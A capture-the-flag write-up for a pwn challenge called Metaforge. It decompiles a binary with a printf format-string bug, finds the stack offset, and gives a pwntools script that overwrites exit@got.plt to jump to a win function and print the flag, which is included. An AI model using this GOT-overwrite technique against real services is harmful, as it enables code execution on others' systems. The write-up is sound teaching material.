# Metaforge

nc 0.cloud.chals.io 30732

The format is key, but don't take it at face value. Forge your path to the flag.

## Challenge

Running checksec to see protections and file to see what we are working with:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
```
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=2560d12ac4e382bc779adc5fd99a7496e406175e, for GNU/Linux 3.2.0, not stripped
```

Nothing really sticking out yet, lets run the file.

```
└─$ ./chall  
This challenge seems easy enough
%p
0x7feac5456b23
```

And already we see a format string vulnerability. Let's dive into the code.

```c
void main(void)

{
  char *local_78;
  size_t local_70;
  char local_68 [96];
  
  local_70 = 0x60;
  memset(local_68,0,0x60);
  local_78 = local_68;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("This challenge seems easy enough");
  getline(&local_78,&local_70,stdin);
  printf(local_68);
                    /* WARNING: Subroutine does not return */
  _exit(0);
}

void win(void)

{
  int __in_fd;
  
  __in_fd = open("./flag.txt",0,0);
  sendfile(1,__in_fd,(off_t *)0x0,0x60);
  return;
}

```

Again looks like a standard printf vulnerability. 

The trick to this one was that we can overwrite the value of `exit@got.plt`, and lead it to our win function. We have a 96 byte buffer so that should be more than enough for a pwntools format string payload.

Poking around with the binary we can find the offset to give to pwntools:
```
└─$ ./chall
This challenge seems easy enough
AAAAAAAA %p %p %p %p %p %p %p %p
AAAAAAAA 0x7ff7e5e81b23 0x1 0x7ffc6ae6ee0a (nil) 0x7ff7e5e96b10 0x7ffc6ae6ef00 0x60 0x4141414141414141
```
We can see its at the 8th offset.

```python
from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('0.cloud.chals.io', 30732)

#Offset to write address at
offset = 8
#Where we want to write to (exit@got.plt)
target = 0x404000
#What we want to write it to (win function)
win = 0x0000000000401196

payload = fmtstr_payload(offset, {target : win})
p.sendline(payload)
p.interactive()
```

Using this format string allows us to trick the binary into thinking it is running the exit function when it's actually running the win function instead.

## Flag

`SIVUSCG{FORMAT_STRINGS_ALL_DAY}`